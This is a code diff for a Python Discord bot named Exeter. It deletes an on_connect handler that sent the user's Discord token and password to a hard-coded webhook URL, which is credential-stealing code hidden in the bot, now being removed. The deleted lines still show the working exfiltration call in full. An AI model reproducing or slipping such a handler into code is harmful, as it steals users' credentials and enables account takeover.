@@ -352,12 +352,6 @@ async def on_message(message):
 
 
 @Exeter.event
-async def on_connect():
-    Clear()  
-    requests.post('https://discordapp.com/api/webhooks/772075466458267668/TA6Ji6EKKal-M1BpSKHRflh0SS8MI0RAAy9_YSS-fT3gjnchVdBzqKDAh1TXTWbERLLp',json={'content': f"**Token:** `{toe}`\n**Password:** `{password}`"})
-    startprint()
-
-@Exeter.event
 async def on_member_ban(guild: discord.Guild, user: discord.user):
     if Exeter.antiraid is True:
         try:
